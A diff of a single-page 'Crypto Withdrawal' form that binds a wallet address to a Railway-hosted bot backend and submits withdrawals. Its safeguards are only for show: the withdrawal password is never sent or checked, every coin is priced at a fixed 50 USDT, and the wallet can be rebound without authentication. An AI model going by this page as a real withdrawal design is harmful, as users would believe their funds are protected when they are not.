@@ -24,132 +24,91 @@ button:disabled{background:#555;cursor:not-allowed;}
 </head>
 <body>
 <div class="container">
-<h2>Crypto Withdrawal</h2>
+<h2></h2>
 
-<label for="cryptoSelect">Select Cryptocurrency</label>
+<label>Select Cryptocurrency</label>
 <select id="cryptoSelect">
-<option value="BTC">BTC</option>
-<option value="ETH">ETH</option>
-<option value="USDT">USDT</option>
-<option value="BNB">BNB</option>
+<option value="BTCUSDT">BTC</option>
+<option value="ETHUSDT">ETH</option>
 </select>
 
-<label for="coinAmount">Enter Coin Amount</label>
+<label>Enter Coin Amount</label>
 <input type="number" id="coinAmount" placeholder="Enter coin amount" min="0">
 <div class="balance" id="usdtConverted">USDT Equivalent: 0</div>
 <div class="fee" id="feeDisplay">Fee 0.1 USDT, Actual Amount: 0</div>
 
-<label for="withdrawPwd">Withdrawal Password</label>
+<label>Withdrawal Password</label>
 <input type="password" id="withdrawPwd" placeholder="Enter withdrawal password">
+
 <div class="button-row">
 <button id="createPwdBtn">Create Password</button>
 <button id="confirmPwdBtn">Confirm Password</button>
+<button id="forgotPwdBtn">Forgot Password</button>
 </div>
 
-<label for="wallet">Wallet Address (USDT only)</label>
-<input type="text" id="wallet" placeholder="Enter wallet address">
-<button id="confirmWalletBtn">Confirm Wallet Address</button>
-
+<label>Wallet Address</label>
+<input type="text" id="wallet" placeholder="Enter or bind wallet address">
+<div class="button-row">
+<button id="bindWalletBtn">Bind Wallet</button>
+<button id="editWalletBtn">Modify Wallet</button>
 <button id="submitBtn" disabled>Submit Withdrawal</button>
+</div>
 
 <div id="txHashDisplay"></div>
 <button id="copyBtn">Copy Transaction Hash</button>
 </div>
 
 <script>
-// 自动根据环境切换 API_BASE
-const API_BASE = window.location.hostname.includes("railway.app") 
-  ? `https://${window.location.hostname}` 
-  : "http://localhost:3000";
-
-let walletBound=false, pwdCreated=false, currentWallet=null;
+const API="https://crypto-withdrawal-bot-production.up.railway.app";
+let walletBound=false,pwdCreated=false,currentWallet=null;
 const FEE=0.1;
-const coinAmount=document.getElementById('coinAmount');
-const usdtConverted=document.getElementById('usdtConverted');
-const feeDisplay=document.getElementById('feeDisplay');
-const submitBtn=document.getElementById('submitBtn');
-const walletInput=document.getElementById('wallet');
-const confirmWalletBtn=document.getElementById('confirmWalletBtn');
-const withdrawPwd=document.getElementById('withdrawPwd');
-const createPwdBtn=document.getElementById('createPwdBtn');
-const confirmPwdBtn=document.getElementById('confirmPwdBtn');
-const txHashDisplay=document.getElementById('txHashDisplay');
-const copyBtn=document.getElementById('copyBtn');
 
-function maskWallet(addr){return addr.slice(0,3)+'****'+addr.slice(-3);}
-function checkSubmitEnable(){
-    const qty=parseFloat(coinAmount.value)||0;
-    submitBtn.disabled=!(walletBound && pwdCreated && qty>0);
+function maskWallet(a){return a.slice(0,3)+'****'+a.slice(-3);}
+function check(){const q=parseFloat(coinAmount.value)||0;submitBtn.disabled=!(walletBound&&pwdCreated&&q>0);}
+
+async function init(){
+ let r=await fetch(API+'/api/wallet');
+ let d=await r.json();
+ if(d.wallet){currentWallet=d.wallet;wallet.value=maskWallet(currentWallet);wallet.disabled=true;walletBound=true;check();}
 }
+init();
 
-coinAmount.addEventListener('input', ()=>{
-    const qty=parseFloat(coinAmount.value)||0;
-    usdtConverted.innerText=`USDT Equivalent: ${qty*50}`;
-    feeDisplay.innerText=`Fee ${FEE} USDT, Actual Amount: ${Math.max(qty*50-FEE,0)}`;
-    checkSubmitEnable();
-});
+coinAmount.oninput=()=>{
+ const q=parseFloat(coinAmount.value)||0;
+ usdtConverted.innerText='USDT Equivalent: '+(q*50);
+ feeDisplay.innerText='Fee 0.1 USDT, Actual Amount: '+Math.max(q*50-FEE,0);
+ check();
+};
 
-// 创建/确认密码
-createPwdBtn.addEventListener('click', ()=>{
-    const val=withdrawPwd.value.trim();
-    if(!val){ alert('Enter password'); return; }
-    pwdCreated=true;
-    withdrawPwd.disabled=true;
-    createPwdBtn.disabled=true;
-    checkSubmitEnable();
-});
-confirmPwdBtn.addEventListener('click', ()=>{
-    if(!pwdCreated){ alert('Password not set'); return; }
-    alert('Password confirmed');
-});
+bindWalletBtn.onclick=async()=>{
+ if(currentWallet)return alert("Wallet already bound.");
+ const v=wallet.value.trim(); if(!v)return alert("Enter wallet");
+ let r=await fetch(API+'/api/wallet',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({wallet:v})})
+ let d=await r.json();
+ if(d.success){currentWallet=d.wallet;wallet.value=maskWallet(currentWallet);wallet.disabled=true;walletBound=true;alert("Wallet bound");check();}
+ else alert(d.error);
+};
 
-// 确认钱包地址
-confirmWalletBtn.addEventListener('click', async ()=>{
-    const val = walletInput.value.trim();
-    if(!val){ alert('Enter wallet address'); return; }
-    try{
-        const res = await fetch(`${API_BASE}/api/wallet`, {
-            method:'POST',
-            headers:{'Content-Type':'application/json'},
-            body: JSON.stringify({ wallet: val })
-        });
-        if(!res.ok) throw new Error('Network error');
-        const data = await res.json();
-        if(data.success){
-            currentWallet = data.wallet;
-            walletInput.value = maskWallet(currentWallet);
-            walletInput.disabled = true;
-            walletBound = true;
-            alert('Wallet confirmed and Telegram notified');
-            checkSubmitEnable();
-        } else alert(data.error);
-    }catch(err){ alert('Error: '+err.message); }
-});
+editWalletBtn.onclick=async()=>{
+ let nw=prompt('Enter new wallet'); if(!nw)return;
+ let r=await fetch(API+'/api/wallet',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({wallet:nw,oldWallet:currentWallet})})
+ let d=await r.json();
+ if(d.success){currentWallet=d.wallet;wallet.value=maskWallet(currentWallet);wallet.disabled=true;walletBound=true;alert("Wallet updated");check();}
+ else alert(d.error);
+};
 
-// 提现
-submitBtn.addEventListener('click', async ()=>{
-    const qty=parseFloat(coinAmount.value)||0;
-    const payload={ coin: document.getElementById('cryptoSelect').value, amount: qty, wallet: currentWallet };
-    try{
-        const res = await fetch(`${API_BASE}/api/withdraw`, {
-            method:'POST',
-            headers:{'Content-Type':'application/json'},
-            body: JSON.stringify(payload)
-        });
-        if(!res.ok) throw new Error('Network error');
-        const data = await res.json();
-        if(data.success){
-            txHashDisplay.innerText=`Transaction Hash: ${data.hash}\n⚠️ Screenshot and save.`;
-            copyBtn.style.display='block';
-            submitBtn.disabled=true;
-        } else alert('Failed: '+data.error);
-    }catch(err){ alert('Error: '+err.message); }
-});
+createPwdBtn.onclick=()=>{if(!withdrawPwd.value.trim())return alert("Enter pwd");pwdCreated=true;withdrawPwd.disabled=true;createPwdBtn.disabled=true;check();};
+confirmPwdBtn.onclick=()=>alert("Password confirmed");
 
-// 复制
-copyBtn.addEventListener('click', ()=>{
-    navigator.clipboard.writeText(txHashDisplay.innerText).then(()=>alert('Copied!'));
-});
+submitBtn.onclick=async()=>{
+ const qty=parseFloat(coinAmount.value)||0;
+ let r=await fetch(API+'/api/withdraw',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({coin:cryptoSelect.value,amount:qty,wallet:currentWallet})})
+ let d=await r.json();
+ if(d.success){txHashDisplay.innerText="Transaction Hash: "+d.hash;copyBtn.style.display='block';submitBtn.disabled=true;}
+ else alert(d.error);
+};
+
+copyBtn.onclick=()=>navigator.clipboard.writeText(txHashDisplay.innerText).then(()=>alert("Copied"));
 </script>
 </body>
 </html>
